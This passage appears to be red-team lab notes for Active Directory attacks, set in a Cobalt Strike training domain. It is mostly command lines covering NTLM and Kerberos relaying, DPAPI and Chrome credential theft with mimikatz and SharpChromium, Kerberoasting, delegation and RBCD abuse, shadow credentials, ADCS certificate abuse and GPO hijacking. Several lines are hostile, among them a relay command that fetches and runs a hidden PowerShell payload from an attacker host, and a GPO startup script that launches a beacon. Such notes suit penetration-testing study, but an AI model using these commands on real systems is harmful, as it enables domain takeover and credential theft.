To trigger the attack, we need to coerce a user or a machine to make an authentication attempt to Workstation 2. Let's do it manually for now, by using the console of Workstation 1 as the user nlamb. This user is a domain admin, so we can relay the authentication request to the domain controller:
```
dir \\10.10.123.102\relayme
```

Use NTLM for administrator from above dump:
```
pth .\Administrator <NTLM>
```

Alternatively run powershell command:
```
proxychains python3 /usr/local/bin/ntlmrelayx.py -t smb://10.10.17.68 -smb2support --no-http-server --no-wcf-server -c 'powershell -nop -w hidden -c "iex (new-object net.webclient).downloadstring(\"http://10.10.17.231:8080/b\")"'

link dc-2.dev.cyberbotic.io TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10
```

Forcing NTLM authentication with images in emails:
```
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```

NTLM authentication with shortcuts:
```
$wsh = new-object -ComObject wscript.shell
$shortcut = $wsh.CreateShortcut("\\dc-2\software\test.lnk")
$shortcut.IconLocation = "\\10.10.17.231\test.ico"
$shortcut.Save()
```
Where software is a share.

Now view the share to trigger the shortcut.

Remote Authentication Triggers execute-assembly:
```
C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe [target] [beacon] execute-assembly

C:\Tools\SharpSystemTriggers\SharpEfsTrigger\bin\Release\SharpEfsTrigger.exe [target] [beacon]
```
## Relaying WebDAV
```
sc qc WebClient
```

```
inline-execute C:\Tools\GetWebDAVStatus\GetWebDAVStatus_BOF\GetWebDAVStatus_x64.o wkstn-1,wkstn-2
```

On attacker:
```
sudo proxychains ntlmrelayx.py -t ldaps://10.10.122.10 --delegate-access -smb2support --http-port 8888
```

```
powershell New-NetFirewallRule -DisplayName "8888-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8888
rportfwd 8888 localhost 8888
```

Then use SharpSystemTriggers to trigger the authentication.  The WebDAV URL needs to point to the reverse port forward:
```
execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe wkstn-1 wkstn-2@8888/pwned
```

```
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /domain:dev.cyberbotic.io /user:<new machine account>$ /password:'<password>'
```

Then perform the S4U2Proxy to request service tickets of your choosing:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:<new machine account>$ /impersonateuser:nlamb /msdsspn:cifs/wkstn-1.dev.cyberbotic.io /aes256:46B94228F43282498F562FEF99C5C4AF67269BE5C8AD31B193135C7BD38A28A2 /nowrap
```

With shadow creds:
```
sudo proxychains ntlmrelayx.py -t ldaps://10.10.122.10 --shadow-credentials -smb2support --http-port 8888
```

```
cat ROsU1G59.pfx | base64 -w 0
```

Since this is a certificate, we use it to request a TGT first which can then be used for S4U2Self:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:WKSTN-1$ /enctype:aes256 /certificate:MIII3Q[...snip...]YFLqI= /password:wBaP2YhsR7RgY0MZ6jwk /nowrap
```
# DPAPI
## Credential manager
Credential manager blobs are stored in users AppData directory:
```
ls C:\Users\bfarmer\AppData\Local\Microsoft\Credentials
```

List creds with native **vaultcmd** in windows:
```
run vaultcmd /list
run vaultcmd /listcreds:"Windows Credentials" /all
run vaultcmd /listcreds:"Web Credentials" /all
```

Or with mimikatz:
```
mimikatz vault::list
```

```
mimikatz !sekurlsa::dpapi
```

To decrypt the credential, we first need to find the master encryption key:
```
mimikatz dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\<...cred...>
```

Look for **pbData** and **guidMasterKey**.

The master key is located under the users **AppData\\Roaming\\Microsoft\\Protect\\SID** directory.
```
ls C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\<SID>
```
There should be a file that matches the **guidMasterKey**.

Use mimikatz with the master key:
```
mimikatz dpapi::masterkey /in:C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\<SID>\<guidMasterKey> /rpc
```
This will only work if executed in the context of the user who owns the key.  If your Beacon is running as another user or SYSTEM, you must impersonate the target user somehow first, then execute the command using the **@** modifier.

Use mimikatz with the **key** from the output above to decrypt the credential:
```
mimikatz dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\<...cred...> /masterkey:<key>
```

Or with Seatbelt:
```
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsVault execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsCredentialFiles
```
## Google chrome
Chrome stores DPAPI credentials in a local SQLite database in the users AppData directory:
```
ls C:\Users\bfarmer\AppData\Local\Google\Chrome\User Data\Default
```

Look for **Login Data** directory and it should not be empty.

Decrypt with **SharpChromium**:
```
execute-assembly C:\Tools\SharpChromium\bin\Debug\SharpChromium.exe logins
```
## Scheduled task credentials
Scheduled Tasks can save credentials so that they can run under the context of a user without them having to be logged on. If we have local admin privileges on a machine, we can decrypt them in much the same way. The blobs are saved under **C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials\\**
```
ls C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials
```

GUID of the master key used to encrypt each one:
```
mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\<cred>
```

Dump cached keys:
```
mimikatz !sekurlsa::dpapi
```

And then decrypt:
```
mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\<cred> /masterkey:<key>
```
# Kerberos

## Kerberoasting
Roast every account in the domain that has SPN set:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe kerberoast /simple /nowrap
```

Bad OPSEC but we can search for all users with SPN not blank instead:
```
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(sAMAccountType=805306368)(servicePrincipalName=*))"
```

A much safer approach is to enumerate possible candidates first and roast them selectively.  This LDAP query will find domain users who have an SPN set:
```
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" --attributes cn,servicePrincipalName,samAccountName
```

With BloodHound:
```
MATCH (u:User {hasspn:true}) RETURN u
```

Paths to computers from kerberoastable accounts:
```
MATCH (u:User {hasspn:true}), (c:Computer), p=shortestPath((u)-[*1..]->(c)) RETURN p
```

Kerberoast specific account with rubeus:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bind\Debug\Rubeus.exe kerberoast /user:svc_mssql /nowrap
```

Crack with john with **--format=krb5tgs --wordlist=rockyou.txt svc_mssql**

Crack with hashcat with **-a 0 -m 13100 svc_mssql rockyou.txt**

### Targeted kerberoasting
Instead of changing password, we set SPN on the account and kerberoast it and attempt to crack offline:
```
powershell Set-DomainObject -Identity jadams -Set @{serviceprincipalname="fake/NOTHING"}
powershell Get-DomainUser -Identity jadams -Properties ServicePrincipalName
```

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe kerberoast /user:jadams /nowrap
```

```
powershell Set-DomainObject -Identity jadams -Clear ServicePrincipalName
```
## AS-REP roasting
User that dont have kerberos pre-authentication enabled can be AS-REP roasted. Requesting a AS-REP for that user and crack it offline.

```
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(sAMAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname
```

```
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname
```

In BloodHound:
```
MATCH (u:User {dontreqpreauth:true}) RETURN u
```

```
execute-assembly C:\Tools\Rubeus\Rubeus\bind\Debug\Rubeus.exe asreproast /user:svc_oracle /nowrap
```

Crack with john with **--format=krb5asrep --wordlist=rockyou.txt svc_mssql**

Crack with hashcat with **-a 0 -m 18200 svc_mssql rockyou.txt**
### Targeted ASREPRoasting
```
powershell Get-DomainUser -Identity jadams | ConvertFrom-UACValue
```

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asreproast /user:jadams /nowrap
```

```
powershell Set-DomainObject -Identity jadams -XOR @{UserAccountControl=4194304}
powershell Get-DomainUser -Identity jadams | ConvertFrom-UACValue
```

## Unconstrained delegation
Delegation allows a user or service to act on behalf of another user to another service. If we compromise a machine with unconstrained delegation, we can extract any TGTs from its memory and use it to impersonate the user against other services in the domain.

This query will return all computers that are permitted for unconstrained delegation:
```
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
```

This query will return all computers that are permitted for unconstrained delegation:
```
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname
```

In BloodHound:
```
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c
```

Domain controllers always have unconstrained delegation configured by default, ignore them.

If there are tickets:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe triage
```

We can dump them:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe dump /luid:<luid> /nowrap
```

And use it:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:<ticket>

steal_token <PID>
```

Monitor with rubeus for TGTs on the server and extract them, requires local admin:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bind\Debug\Rubeus.exe monitor /interval:10 /nowrap
```

And run **SharpSpoolTrigger**:
```
execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Debug\SharpSpoolTrigger.exe dc-2.dev.cyberbotic.io web.dev.cyberbotic.io
```
Where **dc-2** is the "target" and **web** is the listener.

If anyone accesses the server, monitor will extract the TGT.

And use it:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:<ticket>

steal_token <PID>
```

Stop monitor with **jobs** and **jobkill** in beacon.

Or use it this way:
Take the base64 encoded ticket from monitor and decode it to a **.kirbi** file, create sacrificial logon process and pass TGT into it:
```
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\nlamb.kirbi", [System.Convert]::FromBase64String("...ticket..."))
```
```
make_token DEV\nlamb FakePass
kerberos_ticket_use C:\Users\Administrator\Desktop\nlamb.kirbi
```
## The printer bug
On SRV-1:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bind\Debug\Rubeus.exe monitor /targetuser:DC-2$ /interval:10 /nowrap
```

On WKSTN-1:
```
execute-assembly C:\Tools\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe dc-2 srv-1
```
Where dc-2 is the target server and srv-1 is the capture server.

```
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\dc-2.kirbi", [System.Convert]::FromBase64String("...ticket..."))
```
```
make_token DEV\DC-2$ FakePass
kerberos_ticket_use C:\Users\Administrator\Desktop\dc-2.kirbi
```
## Constrained delegation
Find all computers configured for constrained delegation and what they are allowed to delegate to:
```
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json
```
Constrained delegation can be configured on user accounts as well as computer accounts.  Make sure you search for both.

In BloodHound:
```
MATCH (c:Computer), (t:Computer), p=((c)-[:AllowedToDelegate]->(t)) RETURN p
```

If there are tickets:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe triage
```

Then:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe dump /luid:<luid> /service:krbtgt /nowrap
```

This will perform an **S4U2Self** first and then an **S4U2Proxy**:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /user:sql-2$ /ticket:<ticket> /nowrap
```
**/impersonateuser** is the user we want to impersonate
**/msdsspn** is the service principal name that SRV-2 is allowed to delegate to
**/user** is the principal allowed to perform the delegation
**/ticket** is the TGT for **/user**.

Grab the final S4U2Proxy ticket and pass it into a new logon session:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:<ticket>

steal_token 5540
```

Alternative:
To perform delegation we need the TGT of the principal trusted for delegation:
```
mimikatz sekurlsa::ekeys
```
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/wkstn-2.dev.cyberbotic.io /user:srv-2$ /aes256:<eKeys> /opsec /ptt
```
**/impersonateuser** is the user we want to impersonate
**/msdsspn** is the service principal name that SRV-2 is allowed to delegate to
**/user** is the principal allowed to perform the delegation
**/aes256** is the **eKeys** of the **/user** from the output from mimikatz
**/opsec** mimic genuine S4U2Self and S4U2Proxy
**/ptt** pass the generated ticket directly into the current logon session
## Alternate service name
Service name is not validated in s4u so we can request TGS for any service run by DC-2$:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:eventlog/dc-2.dev.cyberbotic.io /altservice:cifs /user:srv-2$ /aes256:<eKeys> /opsec /ptt
```

Alternative, request for LDAP service:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /altservice:ldap /user:sql-2$ /ticket:<ticket> /nowrap
```

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:<ticket>

steal_token 2580
```

Against a domain controller, the LDAP service allows us to perform a dcsync:
```
dcsync dev.cyberbotic.io DEV\krbtgt
```
## S4U2Self abuse
If we have a TGT for a machine account and want to access it remotely. We got it previously for example with **SharpSpoolTrigger**.

Abuse **S4U2Self** to obtain a usable TGS as a user we know is a local admin (e.g. a domain admin).  Rubeus has a **/self** flag for this purpose:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe s4u /impersonateuser:nlamb /self /altservice:cifs/dc-2.dev.cyberbotic.io /user:dc-2$ /ticket:<ticket> /nowrap
```

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:<ticket>

steal_token 2664
```
## Resource-based constrained delegation
This query will obtain every domain computer and read their ACL, filtering on the interesting rights.  This will produce a handful of results, but the one shown is the one of interest.  It shows that the Developers group has WriteProperty rights on all properties (see the ObjectAceType) for DC-2:
```
powershell Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }
```

A common means of obtaining a principal with an SPN is to use a computer account.  Since we have elevated privileges on Workstation 2, we can use that.  To start the attack, we need its SID:
```
powershell Get-DomainComputer -Identity wkstn-2 -Properties objectSid
```

We'll then use this inside an SDDL to create a security descriptor.  The content of msDS-AllowedToActOnBehalfOfOtherIdentity must be in raw binary format:
```
$rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-569305411-121244042-2357301523-1109)"
$rsdb = New-Object byte[] ($rsd.BinaryLength)
$rsd.GetBinaryForm($rsdb, 0)
```

These descriptor bytes can then be used with Set-DomainObject.  However, since we're working through Cobalt Strike, everything has to be concatenated into a single PowerShell command:
```
powershell $rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-569305411-121244042-2357301523-1109)"; $rsdb = New-Object byte[] ($rsd.BinaryLength); $rsd.GetBinaryForm($rsdb, 0); Get-DomainComputer -Identity "dc-2" | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity' = $rsdb} -Verbose

powershell Get-DomainComputer -Identity "dc-2" -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
```

Next, we use the WKSN-2$ account to perform the S4U impersonation with Rubeus. The s4u command requires a TGT, RC4 or AES hash. Since we already have elevated access to it, we can just extract its TGT from memory:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe triage
```

Then perform the s4u:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe s4u /user:WKSTN-2$ /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /ticket:<ticket> /nowrap
```

Finally, pass the ticket into a logon session for use:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:<ticket>

steal_token 4092
```

If you did not have local admin access to a computer already, you can resort to creating your own computer object.  By default, even domain users can join up to 10 computers to a domain - controlled via the ms-DS-MachineAccountQuota attribute of the domain object:
```
powershell Get-DomainObject -Identity "DC=dev,DC=cyberbotic,DC=io" -Properties ms-DS-MachineAccountQuota
```

[StandIn](https://github.com/FuzzySecurity/StandIn) is a post-ex toolkit written by Ruben Boonen and has the functionality to create a computer with a random password:
```
execute-assembly C:\Tools\StandIn\StandIn\StandIn\bin\Debug\StandIn.exe --computer EvilComputer --make
```

Rubeus hash can take that password and calculate their hashes:
```
C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe hash /password:oIrpupAtF1YCXaw /user:EvilComputer$ /domain:dev.cyberbotic.io
```

These can then be used with asktgt to obtain a TGT for the fake computer:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:EvilComputer$ /aes256:<eKeys> /nowrap
```

And the rest of the attack is the same.
## Shadow credentials
[Whisker](https://github.com/eladshamir/Whisker)

First, we want to list any keys that might already be present for a target - this is important for when we want to clean up later:
```
execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe list /target:dc-2$
```

Add a new key pair to the target:
```
execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe add /target:dc-2$
```

And now, we can ask for a TGT using the Rubeus command that Whisker provides:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:dc-2$ /certificate:<cert from above> /password:"<pass from above>" /nowrap
```
## Kerberos relay attacks
[KrbRelayUp](https://github.com/ShorSec/KrbRelayUp)can automate most of the exploitation steps required.

[KrbRelay](https://github.com/cube0x0/KrbRelay) will be used to relay.

As mentioned in the RBCD lesson, it is necessary to have control over another computer object to abuse.  If available, the easiest way is to add your own computer object to the domain and get its SID:
```
execute-assembly C:\Tools\StandIn\StandIn\StandIn\bin\Release\StandIn.exe --computer EvilComputer --make

powershell Get-DomainComputer -Identity EvilComputer -Properties objectsid
```

The next step is to find a suitable port for the OXID resolver to circumvent a check in the Remote Procedure Call Service (RPCSS).  This can be done with **CheckPort.exe**:
```
execute-assembly C:\Tools\KrbRelay\CheckPort\bin\Release\CheckPort.exe
```

With that, run KrbRelay:
```
execute-assembly C:\Tools\KrbRelay\KrbRelay\bin\Release\KrbRelay.exe -spn ldap/dc-2.dev.cyberbotic.io -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8 -rbcd S-1-5-21-569305411-121244042-2357301523-9101 -port 10
```
**-spn** is the target service to relay to
**-clsid** represents RPC_C_IMP_LEVEL_IMPERSONATE
**-rbcd** is the SID of the fake computer account
**-port** is the port returned by CheckPort.

If we query **WKSTN-2$**, we'll see that there's now an entry in its **msDS-AllowedToActOnBehalfOfOtherIdentity** attribute:
```
powershell Get-DomainComputer -Identity wkstn-2 -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
```

Because we have the password associated with **EvilComputer**, we can request a TGT and perform an **S4U** to obtain a usable service tickets for **WKSTN-2**.  Let's use this to get a ticket for **HOST/WKSTN-2**:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:EvilComputer$ /aes256:1DE19DC9065CFB29D6F3E034465C56D1AEC3693DB248F04335A98E129281177A /nowrap
```

Elevate with **C:\\Tools\\SCMUACBypass**:
```
elevate svc-exe-krb tcp-local
```
### Shadow credentials
The advantage of using shadow credentials over RBCD is that we don't need to add a fake computer to the domain. First, verify that **WKSTN-2** has nothing in its **msDS-KeyCredentialLink attribute**:
```
execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe list /target:wkstn-2$
```

Run **KrbRelay** as before, but this time with the **-shadowcred** parameter:
```
execute-assembly C:\Tools\KrbRelay\KrbRelay\bin\Release\KrbRelay.exe -spn ldap/dc-2.dev.cyberbotic.io -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8 -shadowcred -port 10
```

Like **Whisker** does, **KrbRelay** will helpfully provide a full Rubeus command that will request a TGT for **WKSTN-2**. However, it will return an RC4 ticket so if you want an AES instead, do:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:WKSTN-2$ /certificate:<cert> /password:"06ce8e51-a71a-4e0c-b8a3-992851ede95f" /enctype:aes256 /nowrap
```

The **S4U2Self** trick can then be used to obtain a HOST service ticket like we did with RBCD:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:Administrator /self /altservice:host/wkstn-2 /user:wkstn-2$ /ticket:<ticket> /ptt

elevate svc-exe-krb tcp-local
```
## Linux credential cache
SSH into a domain connected linux machine and extract cached TGT:
```
ls -la /tmp
```
Download the **krb5cc_xxx** files to your kali attacking machine.

Use impacket to convert the ticket from ccache to kirbi format:
```
impacket-ticketConverter krb5cc_xxx jking.kirbi
```

Use the kirbi with a sacrificial logon session:
```
make_token DEV\jking FakePass
kerberos_ticket_use C:\Users\Administrator\Desktop\jking.kirbi
```
# Active directory certificate services
## Fix Certify
Change Certify source code in Cert.cs line 89 from:
```
objPkcs10.InitializeFromPrivateKey(context, privateKey, templateName);
```

To:
```
objPkcs10.InitializeFromPrivateKey(context, privateKey, "");

CX509ExtensionTemplateName templateExtension = new CX509ExtensionTemplateName();
templateExtension.InitializeEncode(templateName);
objPkcs10.X509Extensions.Add((CX509Extension)templateExtension);
```
## Find CA
To find AD CS Certificate Authorities (CA's) in a domain or forest, run Certify with the cas parameter:
```
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe cas
```
## Misconfigured certificate templates
Certify can also find vulnerable templates:
```
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find /vulnerable
```
- **ENROLLEE_SUPPLIES_SUBJECT** is enabled, which allows the certificate requestor to provide any SAN (subject alternative name).
- The certificate usage has **Client Authentication** set.
- **DEV\\Domain Users** have enrollment rights, so any domain user may request a certificate from this template.

This configuration allows any domain user to request a certificate for any other domain user (including a domain admin) and use it for authentication.  Request a certificate for nlamb:
```
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:CustomUser /altname:nlamb
```

Convert certificate:
```
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

```
cat cert.pfx | base64 -w 0
```

Then use **asktgt** to request a TGT for the user using the certificate:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /certificate:<cert pfx b64> /password:pass123 /nowrap
```
## NTLM relaying to ADCS HTTP endpoints
This endpoint is usually found at http[s]://hostname/certsrv.

To achieve this, we need:
- **PortBender** on **Workstation 2** to capture traffic on port **445** and redirect it to port **8445**.
- A reverse port forward to forward traffic hitting port **8445** to the team server on port **445**.
- A SOCKS proxy for **ntlmrelayx** to send traffic back into the network.

On attacker:
```
sudo proxychains ntlmrelayx.py -t https://10.10.122.10/certsrv/certfnsh.asp -smb2support --adcs --no-http-server
```

Then force the authentication to occur from **WEB** to **WKSTN-2**:
```
execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe 10.10.122.30 10.10.123.102
```

The S4U2Self trick can be used to obtain usable TGS's to move laterally to it.
## User & Computer Persistence
```
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe Certificates
```
Always ensure the certificate is used for client authentication.

Certificates can be exported with Mimikatz using **crypto::certificates** (although it drops them to disk):
```
mimikatz crypto::certificates /export
```

```
cat /mnt/c/Users/Attacker/Desktop/CURRENT_USER_My_0_Nina\ Lamb.pfx | base64 -w 0
```

Then use it with **Rubeus** to obtain a TGT. The export password will be **mimikatz**:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /certificate:<cert pfx b64> /password:mimikatz /nowrap
```
You can force the use of AES256 by including the /enctype:aes256 parameter.

If the user does not have a certificate in their store, we can just request one with Certify:
```
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:User
```

For computers, must be elevated:
```
mimikatz !crypto::certificates /systemstore:local_machine /export
```

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:WKSTN-1$ /enctype:aes256 /certificate:<cert pfx b64> /password:mimikatz /nowrap
```

If requesting a machine certificate with Certify, the **/machine** parameter is required to auto-elevate to SYSTEM and assume the identity of the computer account:
```
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:Machine /machine
```
# Group policy
The following is with powerview.
## Modify existing GPO
Find SIDs of principals that can create new GPOs in the domain:
```
powershell Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=IO" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl
```

Convert SID to readable text:
```
powershell ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1125
```

Get principals that can write to the GP-Link attribute on OUs:
```
powershell Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, SecurityIdentifier | fl
```

Get all machines within an OU:
```
powershell Get-DomainComputer | ? { $_.DistinguishedName -match "OU=Tier 1" } | select DnsHostName
```

Get any GPO in the domain where a 4-digit RID has **WriteProperty**, **WriteDacl** or **WriteOwner**:
```
powershell Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|WriteDacl|WriteOwner" -and $_.SecurityIdentifier -match "S-1-5-21-3263068140-2042698922-2891547269-[\d]{4,10}" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl
```

Or:
```
powershell Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }
```

Resolve ObjectDN:
```
powershell Get-DomainGPO -Name "{...}" -Properties DisplayName
powershell Get-DomainGPO -Identity "CN={5059FAC1-5E94-4361-95D3-3BB235A23928},CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" | select displayName, gpcFileSysPath

powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107
```

In BloodHound:
```
MATCH (gr:Group), (gp:GPO), p=((gr)-[:GenericWrite]->(gp)) RETURN p
```

Find which OUs the GPO applies to:
```
powershell Get-DomainOU -GPLink "{5059FAC1-5E94-4361-95D3-3BB235A23928}" | select distinguishedName
```

Get computers in an OU:
```
powershell Get-DomainComputer -SearchBase "OU=Workstations,DC=dev,DC=cyberbotic,DC=io" | select dnsHostName
```

To modify a GPO:
```
execute-assembly C:\Tools\SharpGPOAbuse\SharpGPOAbuse\bin\Release\SharpGPOAbuse.exe --AddComputerScript --ScriptName startup.bat --ScriptContents "start /b \\dc-2\software\dns_x64.exe" --GPOName "Vulnerable GPO"
```
## Create & link a GPO
```
powershell Get-DomainObjectAcl -Identity "CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" -and $_.ActiveDirectoryRights -contains "CreateChild" } | % { ConvertFrom-SID $_.SecurityIdentifier }
```

```
powershell Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN,ActiveDirectoryRights,ObjectAceType,SecurityIdentifier | fl

powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107
```

```
